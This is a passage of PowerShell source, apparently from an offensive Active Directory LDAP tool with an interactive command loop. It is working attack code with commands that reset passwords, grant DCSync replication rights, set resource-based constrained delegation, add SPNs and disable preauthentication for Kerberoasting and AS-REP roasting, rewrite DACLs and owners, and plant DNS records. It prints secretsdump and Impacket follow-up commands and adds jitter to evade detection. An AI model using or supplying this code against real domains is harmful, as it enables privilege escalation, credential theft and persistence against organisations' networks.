                        Write-Host "  [-] Failed: $($_.Exception.Message)" -ForegroundColor Red
                        Write-Host "  [i] Requires WriteProperty on msDS-KeyCredentialLink" -ForegroundColor Yellow
                    }
                    continue
                }
                'clearcred' {
                    if (-not $arg) { Write-Host "  Usage: clearcred <sAMAccountName or DN>" -ForegroundColor Yellow; continue }
                    $ccTarget = $arg
                    $ccDN = $ccTarget
                    if ($ccTarget -notmatch ',') {
                        try {
                            $fReq = New-Object System.DirectoryServices.Protocols.SearchRequest(
                                $searchBase, "(sAMAccountName=$ccTarget)", "Subtree", @("distinguishedName")
                            )
                            $fReq.SizeLimit = 1
                            $fResp = $ldap.SendRequest($fReq)
                            if ($fResp.Entries.Count -eq 0) { Write-Host "  [-] Not found: $ccTarget" -ForegroundColor Red; continue }
                            $ccDN = $fResp.Entries[0].DistinguishedName
                        } catch { Write-Host "  [-] Resolve failed: $($_.Exception.Message)" -ForegroundColor Red; continue }
                    }
                    $ccMod = New-Object System.DirectoryServices.Protocols.ModifyRequest
                    $ccMod.DistinguishedName = $ccDN
                    $ccAttr = New-Object System.DirectoryServices.Protocols.DirectoryAttributeModification
                    $ccAttr.Name = "msDS-KeyCredentialLink"
                    $ccAttr.Operation = [System.DirectoryServices.Protocols.DirectoryAttributeOperation]::Replace
                    $ccMod.Modifications.Add($ccAttr) | Out-Null
                    try {
                        $ldap.SendRequest($ccMod) | Out-Null
                        Write-Host "  [+] Cleared all key credentials on $ccDN" -ForegroundColor Green
                    } catch {
                        Write-Host "  [-] Failed: $($_.Exception.Message)" -ForegroundColor Red
                    }
                    continue
                }
                'passwd' {
                    if (-not $arg) { Write-Host "  Usage: passwd <DN or sAMAccountName> [newPassword]" -ForegroundColor Yellow; continue }
                    $passParts = $arg -split '\s+', 2
                    $passTarget = $passParts[0]
                    $passNew = if ($passParts.Count -gt 1) { $passParts[1] }
                    else { -join ((48..57) + (65..90) + (97..122) + (33,35,36,37,38,42) | Get-Random -Count 16 | ForEach-Object { [char]$_ }) }
                    # Resolve DN if sAMAccountName
                    $passDN = $passTarget
                    if ($passTarget -notmatch ',') {
                        try {
                            $findReq = New-Object System.DirectoryServices.Protocols.SearchRequest(
                                $searchBase, "(sAMAccountName=$passTarget)", "Subtree", @("distinguishedName")
                            )
                            $findReq.SizeLimit = 1
                            $findResp = $ldap.SendRequest($findReq)
                            if ($findResp.Entries.Count -eq 0) {
                                Write-Host "  [-] User not found: $passTarget" -ForegroundColor Red; continue
                            }
                            $passDN = $findResp.Entries[0].DistinguishedName
                            Write-Host "  [i] Resolved: $passDN" -ForegroundColor Gray
                        } catch { Write-Host "  [-] Resolve failed: $($_.Exception.Message)" -ForegroundColor Red; continue }
                    }
                    $quotedPwd = [System.Text.Encoding]::Unicode.GetBytes("`"$passNew`"")
                    $mod = New-Object System.DirectoryServices.Protocols.ModifyRequest(
                        $passDN,
                        [System.DirectoryServices.Protocols.DirectoryAttributeOperation]::Replace,
                        "unicodePwd",
                        $quotedPwd
                    )
                    try {
                        $ldap.SendRequest($mod) | Out-Null
                        Write-Host "  [+] Password reset for $passDN" -ForegroundColor Green
                        Write-Host "  [+] New password: $passNew" -ForegroundColor Cyan
                    } catch {
                        Write-Host "  [-] Failed: $($_.Exception.Message)" -ForegroundColor Red
                    }
                    continue
                }
                'addmember' {
                    if (-not $arg) { Write-Host "  Usage: addmember <groupName or DN> <memberName or DN>" -ForegroundColor Yellow; continue }
                    $amParts = $arg -split '\s+', 2
                    if ($amParts.Count -lt 2) { Write-Host "  Usage: addmember <group> <member>" -ForegroundColor Yellow; continue }
                    $amGroup = $amParts[0]; $amMember = $amParts[1]
                    # Resolve group DN
                    $amGroupDN = $amGroup
                    if ($amGroup -notmatch ',') {
                        try {
                            $fReq = New-Object System.DirectoryServices.Protocols.SearchRequest(
                                $searchBase, "(&(objectCategory=group)(cn=$amGroup))", "Subtree", @("distinguishedName")
                            )
                            $fReq.SizeLimit = 1
                            $fResp = $ldap.SendRequest($fReq)
                            if ($fResp.Entries.Count -eq 0) { Write-Host "  [-] Group not found: $amGroup" -ForegroundColor Red; continue }
                            $amGroupDN = $fResp.Entries[0].DistinguishedName
                        } catch { Write-Host "  [-] Resolve failed: $($_.Exception.Message)" -ForegroundColor Red; continue }
                    }
                    # Resolve member DN
                    $amMemberDN = $amMember
                    if ($amMember -notmatch ',') {
                        try {
                            $fReq = New-Object System.DirectoryServices.Protocols.SearchRequest(
                                $searchBase, "(sAMAccountName=$amMember)", "Subtree", @("distinguishedName")
                            )
                            $fReq.SizeLimit = 1
                            $fResp = $ldap.SendRequest($fReq)
                            if ($fResp.Entries.Count -eq 0) { Write-Host "  [-] Member not found: $amMember" -ForegroundColor Red; continue }
                            $amMemberDN = $fResp.Entries[0].DistinguishedName
                        } catch { Write-Host "  [-] Resolve failed: $($_.Exception.Message)" -ForegroundColor Red; continue }
                    }
                    Write-Host "  [>] Adding $amMemberDN -> $amGroupDN" -ForegroundColor Gray
                    $mod = New-Object System.DirectoryServices.Protocols.ModifyRequest(
                        $amGroupDN,
                        [System.DirectoryServices.Protocols.DirectoryAttributeOperation]::Add,
                        "member",
                        $amMemberDN
                    )
                    try {
                        $ldap.SendRequest($mod) | Out-Null
                        Write-Host "  [+] Member added successfully" -ForegroundColor Green
                    } catch {
                        Write-Host "  [-] Failed: $($_.Exception.Message)" -ForegroundColor Red
                    }
                    continue
                }
                'delmember' {
                    if (-not $arg) { Write-Host "  Usage: delmember <groupName or DN> <memberName or DN>" -ForegroundColor Yellow; continue }
                    $dmParts = $arg -split '\s+', 2
                    if ($dmParts.Count -lt 2) { Write-Host "  Usage: delmember <group> <member>" -ForegroundColor Yellow; continue }
                    $dmGroup = $dmParts[0]; $dmMember = $dmParts[1]
                    # Resolve group DN
                    $dmGroupDN = $dmGroup
                    if ($dmGroup -notmatch ',') {
                        try {
                            $fReq = New-Object System.DirectoryServices.Protocols.SearchRequest(
                                $searchBase, "(&(objectCategory=group)(cn=$dmGroup))", "Subtree", @("distinguishedName")
                            )
                            $fReq.SizeLimit = 1
                            $fResp = $ldap.SendRequest($fReq)
                            if ($fResp.Entries.Count -eq 0) { Write-Host "  [-] Group not found: $dmGroup" -ForegroundColor Red; continue }
                            $dmGroupDN = $fResp.Entries[0].DistinguishedName
                        } catch { Write-Host "  [-] Resolve failed: $($_.Exception.Message)" -ForegroundColor Red; continue }
                    }
                    # Resolve member DN
                    $dmMemberDN = $dmMember
                    if ($dmMember -notmatch ',') {
                        try {
                            $fReq = New-Object System.DirectoryServices.Protocols.SearchRequest(
                                $searchBase, "(sAMAccountName=$dmMember)", "Subtree", @("distinguishedName")
                            )
                            $fReq.SizeLimit = 1
                            $fResp = $ldap.SendRequest($fReq)
                            if ($fResp.Entries.Count -eq 0) { Write-Host "  [-] Member not found: $dmMember" -ForegroundColor Red; continue }
                            $dmMemberDN = $fResp.Entries[0].DistinguishedName
                        } catch { Write-Host "  [-] Resolve failed: $($_.Exception.Message)" -ForegroundColor Red; continue }
                    }
                    Write-Host "  [>] Removing $dmMemberDN from $dmGroupDN" -ForegroundColor Gray
                    $mod = New-Object System.DirectoryServices.Protocols.ModifyRequest(
                        $dmGroupDN,
                        [System.DirectoryServices.Protocols.DirectoryAttributeOperation]::Delete,
                        "member",
                        $dmMemberDN
                    )
                    try {
                        $ldap.SendRequest($mod) | Out-Null
                        Write-Host "  [+] Member removed successfully" -ForegroundColor Green
                    } catch {
                        Write-Host "  [-] Failed: $($_.Exception.Message)" -ForegroundColor Red
                    }
                    continue
                }
                'setrbcd' {
                    if (-not $arg) { Write-Host "  Usage: setrbcd <targetComputerDN> <principalDN>" -ForegroundColor Yellow; continue }
                    $rbcdParts = $arg -split '\s+', 2
                    if ($rbcdParts.Count -lt 2) { Write-Host "  Usage: setrbcd <targetDN> <principalDN>" -ForegroundColor Yellow; continue }
                    $rbcdTarget = $rbcdParts[0]; $rbcdPrinc = $rbcdParts[1]
                    # Resolve principal SID
                    try {
                        $sidReq = New-Object System.DirectoryServices.Protocols.SearchRequest(
                            $rbcdPrinc, "(objectClass=*)", "Base", @("objectSid")
                        )
                        $sidResp = $ldap.SendRequest($sidReq)
                        if ($sidResp.Entries.Count -eq 0) { Write-Host "  [-] Principal not found" -ForegroundColor Red; continue }
                        $sidBytes = $sidResp.Entries[0].Attributes["objectSid"][0]
                        $sidObj = New-Object System.Security.Principal.SecurityIdentifier($sidBytes, 0)
                        $sid = $sidObj.Value
                        Write-Host "  [i] Principal SID: $sid" -ForegroundColor Gray
                    } catch { Write-Host "  [-] SID resolve failed: $($_.Exception.Message)" -ForegroundColor Red; continue }
                    $rawSD = New-Object System.Security.AccessControl.RawSecurityDescriptor("O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$sid)")
                    $sdBytes = New-Object byte[] $rawSD.BinaryLength
                    $rawSD.GetBinaryForm($sdBytes, 0)
                    $mod = New-Object System.DirectoryServices.Protocols.ModifyRequest(
                        $rbcdTarget,
                        [System.DirectoryServices.Protocols.DirectoryAttributeOperation]::Replace,
                        "msDS-AllowedToActOnBehalfOfOtherIdentity",
                        $sdBytes
                    )
                    try {
                        $ldap.SendRequest($mod) | Out-Null
                        Write-Host "  [+] RBCD set: $rbcdPrinc -> $rbcdTarget" -ForegroundColor Green
                    } catch {
                        Write-Host "  [-] Failed: $($_.Exception.Message)" -ForegroundColor Red
                    }
                    continue
                }
                'delrbcd' {
                    if (-not $arg) { Write-Host "  Usage: delrbcd <targetComputerDN>" -ForegroundColor Yellow; continue }
                    $mod = New-Object System.DirectoryServices.Protocols.ModifyRequest
                    $mod.DistinguishedName = $arg
                    $attrMod = New-Object System.DirectoryServices.Protocols.DirectoryAttributeModification
                    $attrMod.Name = "msDS-AllowedToActOnBehalfOfOtherIdentity"
                    $attrMod.Operation = [System.DirectoryServices.Protocols.DirectoryAttributeOperation]::Delete
                    $mod.Modifications.Add($attrMod) | Out-Null
                    try {
                        $ldap.SendRequest($mod) | Out-Null
                        Write-Host "  [+] RBCD cleared on $arg" -ForegroundColor Green
                    } catch {
                        Write-Host "  [-] Failed: $($_.Exception.Message)" -ForegroundColor Red
                    }
                    continue
                }
                'setdcsync' {
                    if (-not $arg) { Write-Host "  Usage: setdcsync <sAMAccountName or DN>" -ForegroundColor Yellow; continue }
                    $dcsDN = Resolve-LdapDN $arg
                    if (-not $dcsDN) { Write-Host "  [-] Not found: $arg" -ForegroundColor Red; continue }
                    $dcsSid = Resolve-LdapSID $dcsDN
                    if (-not $dcsSid) { Write-Host "  [-] Cannot resolve SID for $dcsDN" -ForegroundColor Red; continue }
                    Write-Host "  [>] Granting DCSync to $dcsDN ($($dcsSid.Value))" -ForegroundColor Yellow
                    try {
                        $sd = Get-LdapSD -DN $ctx.DomainDN -Flags 4
                        if (-not $sd) { throw "Cannot read domain DACL" }
                        # DS-Replication-Get-Changes
                        $ace1 = New-Object System.Security.AccessControl.ObjectAce(
                            [System.Security.AccessControl.AceFlags]::None,
                            [System.Security.AccessControl.AceQualifier]::AccessAllowed,
                            0x100, $dcsSid,
                            [System.Security.AccessControl.ObjectAceFlags]::ObjectAceTypePresent,
                            [guid]'1131f6aa-9c07-11d1-f79f-00c04fc2dcd2',
                            [guid]::Empty, $false, $null
                        )
                        # DS-Replication-Get-Changes-All
                        $ace2 = New-Object System.Security.AccessControl.ObjectAce(
                            [System.Security.AccessControl.AceFlags]::None,
                            [System.Security.AccessControl.AceQualifier]::AccessAllowed,
                            0x100, $dcsSid,
                            [System.Security.AccessControl.ObjectAceFlags]::ObjectAceTypePresent,
                            [guid]'1131f6ad-9c07-11d1-f79f-00c04fc2dcd2',
                            [guid]::Empty, $false, $null
                        )
                        $sd.DiscretionaryAcl.InsertAce(0, $ace1)
                        $sd.DiscretionaryAcl.InsertAce(1, $ace2)
                        Set-LdapSD -DN $ctx.DomainDN -SD $sd -Flags 4
                        Write-Host "  [+] DCSync rights granted" -ForegroundColor Green
                        Write-Host "  [i] secretsdump.py '$($ctx.Domain)/$arg@$($ctx.Domain)' -just-dc" -ForegroundColor Gray
                    } catch { Write-Host "  [-] Failed: $($_.Exception.Message)" -ForegroundColor Red }
                    continue
                }
                'addspn' {
                    if (-not $arg) { Write-Host "  Usage: addspn <account> <SPN>" -ForegroundColor Yellow; continue }
                    $spnParts = $arg -split '\s+', 2
                    if ($spnParts.Count -lt 2) { Write-Host "  Usage: addspn <account> <SPN>" -ForegroundColor Yellow; continue }
                    $spnDN = Resolve-LdapDN $spnParts[0]
                    if (-not $spnDN) { Write-Host "  [-] Not found: $($spnParts[0])" -ForegroundColor Red; continue }
                    $mod = New-Object System.DirectoryServices.Protocols.ModifyRequest(
                        $spnDN, [System.DirectoryServices.Protocols.DirectoryAttributeOperation]::Add,
                        "servicePrincipalName", $spnParts[1]
                    )
                    try {
                        $ldap.SendRequest($mod) | Out-Null
                        Write-Host "  [+] SPN added: $($spnParts[1]) on $spnDN" -ForegroundColor Green
                        Write-Host "  [i] Kerberoast: GetUserSPNs.py -request $($ctx.Domain)/<user>" -ForegroundColor Gray
                    } catch { Write-Host "  [-] Failed: $($_.Exception.Message)" -ForegroundColor Red }
                    continue
                }
                'delspn' {
                    if (-not $arg) { Write-Host "  Usage: delspn <account> <SPN>" -ForegroundColor Yellow; continue }
                    $spnParts = $arg -split '\s+', 2
                    if ($spnParts.Count -lt 2) { Write-Host "  Usage: delspn <account> <SPN>" -ForegroundColor Yellow; continue }
                    $spnDN = Resolve-LdapDN $spnParts[0]
                    if (-not $spnDN) { Write-Host "  [-] Not found: $($spnParts[0])" -ForegroundColor Red; continue }
                    $mod = New-Object System.DirectoryServices.Protocols.ModifyRequest(
                        $spnDN, [System.DirectoryServices.Protocols.DirectoryAttributeOperation]::Delete,
                        "servicePrincipalName", $spnParts[1]
                    )
                    try {
                        $ldap.SendRequest($mod) | Out-Null
                        Write-Host "  [+] SPN removed: $($spnParts[1])" -ForegroundColor Green
                    } catch { Write-Host "  [-] Failed: $($_.Exception.Message)" -ForegroundColor Red }
                    continue
                }
                'setasrep' {
                    if (-not $arg) { Write-Host "  Usage: setasrep <sAMAccountName>" -ForegroundColor Yellow; continue }
                    $arDN = Resolve-LdapDN $arg
                    if (-not $arDN) { Write-Host "  [-] Not found: $arg" -ForegroundColor Red; continue }
                    try {
                        # Read current UAC
                        $uacReq = New-Object System.DirectoryServices.Protocols.SearchRequest(
                            $arDN, "(objectClass=*)", "Base", @("userAccountControl")
                        )
                        $uacResp = $ldap.SendRequest($uacReq)
                        $curUAC = [int]$uacResp.Entries[0].Attributes["userAccountControl"][0]
                        $newUAC = $curUAC -bor 0x400000  # DONT_REQUIRE_PREAUTH
                        $mod = New-Object System.DirectoryServices.Protocols.ModifyRequest(
                            $arDN, [System.DirectoryServices.Protocols.DirectoryAttributeOperation]::Replace,
                            "userAccountControl", $newUAC.ToString()
                        )
                        $ldap.SendRequest($mod) | Out-Null
                        Write-Host "  [+] DONT_REQUIRE_PREAUTH set on $arg" -ForegroundColor Green
                        Write-Host "  [i] AS-REP roast: GetNPUsers.py $($ctx.Domain)/$arg -no-pass" -ForegroundColor Gray
                    } catch { Write-Host "  [-] Failed: $($_.Exception.Message)" -ForegroundColor Red }
                    continue
                }
                'setowner' {
                    if (-not $arg) { Write-Host "  Usage: setowner <targetDN> <newOwner>" -ForegroundColor Yellow; continue }
                    $soParts = $arg -split '\s+', 2
                    if ($soParts.Count -lt 2) { Write-Host "  Usage: setowner <target> <newOwner>" -ForegroundColor Yellow; continue }
                    $soDN = Resolve-LdapDN $soParts[0]
                    if (-not $soDN) { Write-Host "  [-] Target not found: $($soParts[0])" -ForegroundColor Red; continue }
                    $soOwnerDN = Resolve-LdapDN $soParts[1]
                    if (-not $soOwnerDN) { Write-Host "  [-] Owner not found: $($soParts[1])" -ForegroundColor Red; continue }
                    $soSid = Resolve-LdapSID $soOwnerDN
                    if (-not $soSid) { Write-Host "  [-] Cannot resolve SID" -ForegroundColor Red; continue }
                    try {
                        $sd = Get-LdapSD -DN $soDN -Flags 1
                        if (-not $sd) { throw "Cannot read SD" }
                        $sd.Owner = $soSid
                        Set-LdapSD -DN $soDN -SD $sd -Flags 1
                        Write-Host "  [+] Owner changed to $($soParts[1]) ($($soSid.Value))" -ForegroundColor Green
                    } catch { Write-Host "  [-] Failed: $($_.Exception.Message)" -ForegroundColor Red }
                    continue
                }
                'writedacl' {
                    if (-not $arg) { Write-Host "  Usage: writedacl <target> <principal> <right>" -ForegroundColor Yellow; continue }
                    $wdParts = $arg -split '\s+', 3
                    if ($wdParts.Count -lt 3) {
                        Write-Host "  Usage: writedacl <target> <principal> <right>" -ForegroundColor Yellow
                        Write-Host "  Rights: GenericAll, WriteDACL, WriteOwner, WriteProp, DCSync, ResetPwd, WriteSPN, WriteKCL" -ForegroundColor Gray
                        continue
                    }
                    $wdDN = Resolve-LdapDN $wdParts[0]
                    $wdPrincDN = Resolve-LdapDN $wdParts[1]
                    if (-not $wdDN -or -not $wdPrincDN) { Write-Host "  [-] Object not found" -ForegroundColor Red; continue }
                    $wdSid = Resolve-LdapSID $wdPrincDN
                    if (-not $wdSid) { Write-Host "  [-] Cannot resolve SID" -ForegroundColor Red; continue }
                    $wdRight = $wdParts[2].ToLower()
                    try {
                        $sd = Get-LdapSD -DN $wdDN -Flags 4
                        if (-not $sd) { throw "Cannot read DACL" }
                        switch ($wdRight) {
                            'genericall' {
                                $ace = New-Object System.Security.AccessControl.CommonAce(
                                    [System.Security.AccessControl.AceFlags]::None,
                                    [System.Security.AccessControl.AceQualifier]::AccessAllowed,
                                    0xF01FF, $wdSid, $false, $null
                                )
                                $sd.DiscretionaryAcl.InsertAce(0, $ace)
                            }
                            'writedacl' {
                                $ace = New-Object System.Security.AccessControl.CommonAce(
                                    [System.Security.AccessControl.AceFlags]::None,
                                    [System.Security.AccessControl.AceQualifier]::AccessAllowed,
                                    0x40000, $wdSid, $false, $null
                                )
                                $sd.DiscretionaryAcl.InsertAce(0, $ace)
                            }
                            'writeowner' {
                                $ace = New-Object System.Security.AccessControl.CommonAce(
                                    [System.Security.AccessControl.AceFlags]::None,
                                    [System.Security.AccessControl.AceQualifier]::AccessAllowed,
                                    0x80000, $wdSid, $false, $null
                                )
                                $sd.DiscretionaryAcl.InsertAce(0, $ace)
                            }
                            'writeprop' {
                                $ace = New-Object System.Security.AccessControl.CommonAce(
                                    [System.Security.AccessControl.AceFlags]::None,
                                    [System.Security.AccessControl.AceQualifier]::AccessAllowed,
                                    0x20, $wdSid, $false, $null
                                )
                                $sd.DiscretionaryAcl.InsertAce(0, $ace)
                            }
                            'dcsync' {
                                $ace1 = New-Object System.Security.AccessControl.ObjectAce(
                                    [System.Security.AccessControl.AceFlags]::None,
                                    [System.Security.AccessControl.AceQualifier]::AccessAllowed,
                                    0x100, $wdSid,
                                    [System.Security.AccessControl.ObjectAceFlags]::ObjectAceTypePresent,
                                    [guid]'1131f6aa-9c07-11d1-f79f-00c04fc2dcd2', [guid]::Empty, $false, $null
                                )
                                $ace2 = New-Object System.Security.AccessControl.ObjectAce(
                                    [System.Security.AccessControl.AceFlags]::None,
                                    [System.Security.AccessControl.AceQualifier]::AccessAllowed,
                                    0x100, $wdSid,
                                    [System.Security.AccessControl.ObjectAceFlags]::ObjectAceTypePresent,
                                    [guid]'1131f6ad-9c07-11d1-f79f-00c04fc2dcd2', [guid]::Empty, $false, $null
                                )
                                $sd.DiscretionaryAcl.InsertAce(0, $ace1)
                                $sd.DiscretionaryAcl.InsertAce(1, $ace2)
                            }
                            'resetpwd' {
                                $ace = New-Object System.Security.AccessControl.ObjectAce(
                                    [System.Security.AccessControl.AceFlags]::None,
                                    [System.Security.AccessControl.AceQualifier]::AccessAllowed,
                                    0x100, $wdSid,
                                    [System.Security.AccessControl.ObjectAceFlags]::ObjectAceTypePresent,
                                    [guid]'00299570-246d-11d0-a768-00aa006e0529', [guid]::Empty, $false, $null
                                )
                                $sd.DiscretionaryAcl.InsertAce(0, $ace)
                            }
                            'writespn' {
                                $ace = New-Object System.Security.AccessControl.ObjectAce(
                                    [System.Security.AccessControl.AceFlags]::None,
                                    [System.Security.AccessControl.AceQualifier]::AccessAllowed,
                                    0x20, $wdSid,
                                    [System.Security.AccessControl.ObjectAceFlags]::ObjectAceTypePresent,
                                    [guid]'f3a64788-5306-11d1-a9c5-0000f80367c1', [guid]::Empty, $false, $null
                                )
                                $sd.DiscretionaryAcl.InsertAce(0, $ace)
                            }
                            'writekcl' {
                                $ace = New-Object System.Security.AccessControl.ObjectAce(
                                    [System.Security.AccessControl.AceFlags]::None,
                                    [System.Security.AccessControl.AceQualifier]::AccessAllowed,
                                    0x20, $wdSid,
                                    [System.Security.AccessControl.ObjectAceFlags]::ObjectAceTypePresent,
                                    [guid]'5b47d60f-6090-40b2-9f37-2a4de88f3063', [guid]::Empty, $false, $null
                                )
                                $sd.DiscretionaryAcl.InsertAce(0, $ace)
                            }
                            default {
                                Write-Host "  [-] Unknown right: $wdRight" -ForegroundColor Red
                                Write-Host "  [i] Options: GenericAll, WriteDACL, WriteOwner, WriteProp, DCSync, ResetPwd, WriteSPN, WriteKCL" -ForegroundColor Gray
                                continue
                            }
                        }
                        Set-LdapSD -DN $wdDN -SD $sd -Flags 4
                        Write-Host "  [+] ACE added: $($wdParts[2]) for $($wdParts[1]) on $($wdParts[0])" -ForegroundColor Green
                    } catch { Write-Host "  [-] Failed: $($_.Exception.Message)" -ForegroundColor Red }
                    continue
                }
                'disable' {
                    if (-not $arg) { Write-Host "  Usage: disable <sAMAccountName>" -ForegroundColor Yellow; continue }
                    $disDN = Resolve-LdapDN $arg
                    if (-not $disDN) { Write-Host "  [-] Not found: $arg" -ForegroundColor Red; continue }
                    try {
                        $uacReq = New-Object System.DirectoryServices.Protocols.SearchRequest(
                            $disDN, "(objectClass=*)", "Base", @("userAccountControl")
                        )
                        $uacResp = $ldap.SendRequest($uacReq)
                        $curUAC = [int]$uacResp.Entries[0].Attributes["userAccountControl"][0]
                        $newUAC = $curUAC -bor 0x2  # ACCOUNTDISABLE
                        $mod = New-Object System.DirectoryServices.Protocols.ModifyRequest(
                            $disDN, [System.DirectoryServices.Protocols.DirectoryAttributeOperation]::Replace,
                            "userAccountControl", $newUAC.ToString()
                        )
                        $ldap.SendRequest($mod) | Out-Null
                        Write-Host "  [+] Account disabled: $arg" -ForegroundColor Green
                    } catch { Write-Host "  [-] Failed: $($_.Exception.Message)" -ForegroundColor Red }
                    continue
                }
                'enable' {
                    if (-not $arg) { Write-Host "  Usage: enable <sAMAccountName>" -ForegroundColor Yellow; continue }
                    $enDN = Resolve-LdapDN $arg
                    if (-not $enDN) { Write-Host "  [-] Not found: $arg" -ForegroundColor Red; continue }
                    try {
                        $uacReq = New-Object System.DirectoryServices.Protocols.SearchRequest(
                            $enDN, "(objectClass=*)", "Base", @("userAccountControl")
                        )
                        $uacResp = $ldap.SendRequest($uacReq)
                        $curUAC = [int]$uacResp.Entries[0].Attributes["userAccountControl"][0]
                        $newUAC = $curUAC -band (-bnot 0x2)  # Clear ACCOUNTDISABLE
                        $mod = New-Object System.DirectoryServices.Protocols.ModifyRequest(
                            $enDN, [System.DirectoryServices.Protocols.DirectoryAttributeOperation]::Replace,
                            "userAccountControl", $newUAC.ToString()
                        )
                        $ldap.SendRequest($mod) | Out-Null
                        Write-Host "  [+] Account enabled: $arg" -ForegroundColor Green
                    } catch { Write-Host "  [-] Failed: $($_.Exception.Message)" -ForegroundColor Red }
                    continue
                }
                'dnsadd' {
                    if (-not $arg) { Write-Host "  Usage: dnsadd <hostname> <IP>" -ForegroundColor Yellow; continue }
                    $dnsParts = $arg -split '\s+', 2
                    if ($dnsParts.Count -lt 2) { Write-Host "  Usage: dnsadd <hostname> <IP>" -ForegroundColor Yellow; continue }
                    $dnsName = $dnsParts[0]; $dnsIP = $dnsParts[1]
                    $zone = $ctx.Domain
                    $dnsDN = "DC=$dnsName,DC=$zone,CN=MicrosoftDNS,DC=DomainDnsZones,$($ctx.DomainDN)"
                    try {
                        $ipBytes = [System.Net.IPAddress]::Parse($dnsIP).GetAddressBytes()
                        # Build DNS_RPC_RECORD for A record
                        $rMs = New-Object System.IO.MemoryStream
                        $rBw = New-Object System.IO.BinaryWriter($rMs)
                        $rBw.Write([uint16]4)       # DataLength
                        $rBw.Write([uint16]1)       # Type = A
                        $rBw.Write([byte]5)         # Version
                        $rBw.Write([byte]240)       # Rank = RANK_ZONE
                        $rBw.Write([uint16]0)       # Flags
                        $rBw.Write([uint32]1)       # Serial
                        $rBw.Write([uint32]900)     # TTL
                        $rBw.Write([uint32]0)       # Reserved
                        $rBw.Write([uint32]0)       # TimeStamp (static)
                        $rBw.Write($ipBytes)        # A record data
                        $rBw.Flush()
                        $recBytes = $rMs.ToArray()
                        $rBw.Dispose(); $rMs.Dispose()
                        # Try create new node
                        $addReq = New-Object System.DirectoryServices.Protocols.AddRequest
                        $addReq.DistinguishedName = $dnsDN
                        $addReq.Attributes.Add((New-Object System.DirectoryServices.Protocols.DirectoryAttribute("objectClass", "dnsNode"))) | Out-Null
                        $addReq.Attributes.Add((New-Object System.DirectoryServices.Protocols.DirectoryAttribute("dnsRecord", $recBytes))) | Out-Null
                        $ldap.SendRequest($addReq) | Out-Null
                        Write-Host "  [+] DNS record added: $dnsName.$zone -> $dnsIP" -ForegroundColor Green
                    } catch {
                        if ($_.Exception.Message -match 'already exists') {
                            # Update existing
                            try {
                                $mod = New-Object System.DirectoryServices.Protocols.ModifyRequest(
                                    $dnsDN, [System.DirectoryServices.Protocols.DirectoryAttributeOperation]::Replace,
                                    "dnsRecord", $recBytes
                                )
                                $ldap.SendRequest($mod) | Out-Null
                                Write-Host "  [+] DNS record updated: $dnsName.$zone -> $dnsIP" -ForegroundColor Green
                            } catch { Write-Host "  [-] Update failed: $($_.Exception.Message)" -ForegroundColor Red }
                        } else {
                            Write-Host "  [-] Failed: $($_.Exception.Message)" -ForegroundColor Red
                        }
                    }
                    continue
                }
                'dnsdel' {
                    if (-not $arg) { Write-Host "  Usage: dnsdel <hostname>" -ForegroundColor Yellow; continue }
                    $zone = $ctx.Domain
                    $dnsDN = "DC=$arg,DC=$zone,CN=MicrosoftDNS,DC=DomainDnsZones,$($ctx.DomainDN)"
                    try {
                        $delReq = New-Object System.DirectoryServices.Protocols.DeleteRequest($dnsDN)
                        $ldap.SendRequest($delReq) | Out-Null
                        Write-Host "  [+] DNS record deleted: $arg.$zone" -ForegroundColor Green
                    } catch { Write-Host "  [-] Failed: $($_.Exception.Message)" -ForegroundColor Red }
                    continue
                }
                'setattr' {
                    if (-not $arg) { Write-Host "  Usage: setattr <DN> <attribute> <value>" -ForegroundColor Yellow; continue }
                    $saParts = $arg -split '\s+', 3
                    if ($saParts.Count -lt 3) { Write-Host "  Usage: setattr <DN> <attribute> <value>" -ForegroundColor Yellow; continue }
                    $saDN = $saParts[0]; $saAttr = $saParts[1]; $saVal = $saParts[2]
                    if ($saDN -notmatch ',') { $saDN = Resolve-LdapDN $saDN; if (-not $saDN) { Write-Host "  [-] Not found" -ForegroundColor Red; continue } }
                    $mod = New-Object System.DirectoryServices.Protocols.ModifyRequest(
                        $saDN, [System.DirectoryServices.Protocols.DirectoryAttributeOperation]::Replace,
                        $saAttr, $saVal
                    )
                    try {
                        $ldap.SendRequest($mod) | Out-Null
                        Write-Host "  [+] Set $saAttr = $saVal on $saDN" -ForegroundColor Green
                    } catch { Write-Host "  [-] Failed: $($_.Exception.Message)" -ForegroundColor Red }
                    continue
                }

                default {
                    if ($cmd.StartsWith('(')) {
                        $searchFilter = $input
                    } else {
                        Write-Host "  Unknown command: $cmd (type 'help' for commands)" -ForegroundColor Yellow
                        continue
                    }
                }
            }

            if (-not $searchFilter) { continue }

            # OPSEC: Apply query delay/jitter if configured
            if ($script:queryDelay -gt 0) {
                $range = [int]($script:queryDelay * $script:queryJitter / 100)
                $actual = $script:queryDelay + (Get-Random -Minimum (-$range) -Maximum ($range + 1))
                if ($actual -gt 0) { Start-Sleep -Milliseconds $actual }
            }

            try {
                $searchReq = New-Object System.DirectoryServices.Protocols.SearchRequest(
                    $searchBase, $searchFilter, $searchScope, $searchAttrs
                )
                $searchReq.SizeLimit = $searchLimit
                $resp = $ldap.SendRequest($searchReq)
                Write-Host "  [+] $($resp.Entries.Count) results" -ForegroundColor Green
                foreach ($entry in $resp.Entries) {
                    Write-Host "    DN: $($entry.DistinguishedName)" -ForegroundColor White
                    foreach ($attrName in $entry.Attributes.AttributeNames) {
                        if ($attrName -eq 'distinguishedName') { continue }
                        if ($showMembers -and $attrName -eq 'member') {
                            $members = @()
                            for ($i = 0; $i -lt $entry.Attributes[$attrName].Count; $i++) {
                                $members += $entry.Attributes[$attrName][$i]
                            }
                            Write-Host "      member ($($members.Count)):" -ForegroundColor Cyan
                            foreach ($m in $members | Select-Object -First 30) {
                                $cn = ($m -split ',')[0] -replace '^CN=',''
                                Write-Host "        - $cn" -ForegroundColor Gray
                            }
                            if ($members.Count -gt 30) { Write-Host "        ... and $($members.Count - 30) more" -ForegroundColor DarkGray }
                            continue
                        }
                        if ($attrName -eq 'msDS-AllowedToActOnBehalfOfOtherIdentity') {
                            try {
                                $sdBytes = $entry.Attributes[$attrName][0]
                                $sd = New-Object System.Security.AccessControl.RawSecurityDescriptor($sdBytes, 0)
                                foreach ($ace in $sd.DiscretionaryAcl) {
                                    Write-Host "      RBCD -> $($ace.SecurityIdentifier.Value)" -ForegroundColor Cyan
                                    try {
                                        $sidObj = $ace.SecurityIdentifier
                                        $ntAcc = $sidObj.Translate([System.Security.Principal.NTAccount])
                                        Write-Host "              ($ntAcc)" -ForegroundColor Gray
                                    } catch {}
                                }
                            } catch {
